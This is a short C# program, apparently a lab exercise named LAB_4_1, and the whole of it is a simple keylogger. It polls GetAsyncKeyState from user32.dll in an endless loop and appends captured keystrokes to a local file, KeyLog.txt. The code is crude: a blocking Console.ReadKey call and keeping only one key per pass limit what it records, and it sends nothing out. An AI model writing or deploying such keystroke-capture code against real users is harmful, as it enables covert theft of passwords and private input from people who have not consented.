using System;
using System.IO;
using System.Runtime.InteropServices;

namespace LAB_4_1
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main()
        {
            while (true)
            {
                StreamWriter file = new StreamWriter("KeyLog.txt", true);
                char key = ' ';
                for (int i = 8; i < 190; i++)
                {
                    if (GetAsyncKeyState(i) != 0)
                    {
                        key = (char)i;
                    }
                }
                file.Write(key);
                Console.ReadKey();
                file.Close();
            }
        }
    }
}